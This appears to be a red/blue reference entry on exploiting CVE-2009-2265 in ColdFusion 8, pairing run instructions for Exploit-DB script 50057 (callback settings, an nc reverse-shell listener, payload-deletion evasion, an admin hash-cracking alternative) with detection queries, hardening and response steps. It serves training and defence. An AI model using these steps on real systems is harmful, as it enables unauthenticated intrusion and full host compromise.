name: ColdFusion - Unauthenticated RCE (CVE-2009-2265)
command: python3 50057.py   # after editing lhost/lport/rhost/rport in the script
description: Adobe ColdFusion 8.0.1 and earlier ship a vulnerable FCKeditor file manager that lets an unauthenticated attacker upload a JSP payload and gain remote code execution (CVE-2009-2265). The EDB script 50057 automates payload generation, upload, and catching the reverse shell - typically landing as the ColdFusion service account (often SYSTEM on Windows).

variations.label: Vulnerable FCKeditor upload endpoint (manual confirmation)
variations.description: Vulnerable FCKeditor upload endpoint (manual confirmation). See the command syntax for exact parameters and flags.

examples.label: Pull the exploit into a working dir
Edit the exploit's connection settings before running
examples.command:
# in 50057.py __main__:
lhost = '<lhost>'   # your VPN IP
lport = <lport>     # local listener port
rhost = '<ip>'      # target
rport = <port>      # 8500

examples.label: Run - it stages the JSP payload and catches the shell

notes: The exploit generates a random-named .jsp payload, uploads it via the FCKeditor connector to /userfiles/file/, starts its own listener, then requests the payload to trigger the reverse shell. No credentials needed. Lands as the ColdFusion8 service account - on Windows this is frequently SYSTEM, so it is often game over without further privesc. If the bundled listener is flaky, comment it out and catch manually with `nc -lvnp <lport>`. Alternative path to admin: read password.properties via coldfusion-directory-traversal, crack the SHA1, then RCE through a scheduled task. Also covered in: OSCP PEN-200 (Web Application Attacks).

recommended.note: Confirm ColdFusion 8.0.1 or earlier before firing this.
Alternative foothold - leak and crack the admin password instead.
If already SYSTEM you are done; otherwise pivot to local privesc.

defense.prerequisites: Adobe ColdFusion 8.0.1 or earlier with the bundled FCKeditor package present and reachable at /CFIDE/scripts/ajax/FCKeditor/. No authentication required.
defense.why_it_works: The FCKeditor connector's FileUpload command does not authenticate the caller or validate the uploaded file type/extension, so a .jsp payload can be written into a web-served directory and then executed by requesting it.
defense.misconfiguration: Unpatched CF8 exposing the FCKeditor file manager to unauthenticated users; upload directory (/userfiles/) is web-executable.
defense.impact: Unauthenticated remote code execution as the ColdFusion service account - commonly SYSTEM on Windows, i.e. full host compromise.
defense.detection: Web log: POST to .../FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload; creation of .jsp files under /userfiles/file/; subsequent GET to a random-named .jsp; unexpected outbound connection from the CF host (reverse shell).
defense.artifacts: Dropped .jsp payload in the CF webroot/userfiles; FCKeditor upload entries in access logs; new child processes spawned by the ColdFusion/JRun process.
defense.splunk_spl:
index=sysmon EventCode=1 (ParentImage="*w3wp.exe" OR ParentImage="*httpd*" OR ParentImage="*apache*" OR ParentImage="*php-cgi*" OR ParentImage="*php-fpm*" OR ParentImage="*java.exe" OR ParentImage="*tomcat*")
| where match(Image, "(?i)(cmd|powershell|bash|sh|nc|python)")
| table _time, Computer, ParentImage, Image, CommandLine

index=web sourcetype=access_combined (method=POST OR status=500)
| stats count by clientip, uri_path | where count>3
defense.elastic_kql: event.code:"1" AND process.parent.name:(w3wp.exe OR httpd OR apache2 OR php-fpm OR java.exe) AND process.name:(cmd.exe OR powershell.exe OR bash OR sh OR nc OR python*)
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","httpd","apache2","php-fpm","php-cgi","java.exe","nginx")
| where FileName in~ ("cmd.exe","powershell.exe","bash","sh","nc","python")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by Timestamp desc
// ColdFusion unauth deserialization RCE - coldfusion/java spawning a shell
defense.vulnerable_config:
# ColdFusion 8.0.1, FCKeditor connector reachable pre-auth
# /CFIDE/scripts/ajax/FCKeditor/.../upload.cfm accepts .jsp
defense.secure_config:
# Apply Adobe hotfix for CVE-2009-2265; remove the bundled FCKeditor
# Block/remove /CFIDE/scripts/ajax/FCKeditor if unused
# Deny script execution in upload directories; run CF as least-privilege
defense.prevention: Patch CVE-2009-2265 and remove the vulnerable FCKeditor. Disable execution in upload directories. Restrict /CFIDE/ to internal IPs. Run ColdFusion as a non-privileged service account, not SYSTEM. [MITRE M1051, M1042, M1026]
defense.evasion: Randomized payload filenames evade static IOC lists; upload then immediately delete the payload after the shell connects (the script does this) to reduce on-disk artifacts.
defense.code_review:
RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.
  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)
GREP:  grep -rniE "move_uploaded_file|\$_FILES|multer|formidable|MultipartFile|SaveAs\(" .
SAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Sysmon, Windows Security Event Log, Web proxy logs for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Exploits the ColdFusion FCKeditor upload flaw for unauth RCE (CVE-2009-2265):
  python3 50057.py   the EDB exploit, after editing lhost/lport/rhost/rport inside it
ColdFusion 8.0.1 and earlier ship a vulnerable FCKeditor file manager; the script uploads a JSP payload and triggers a shell - fetch it with 'searchsploit -p 50057' and set the callback details before running.
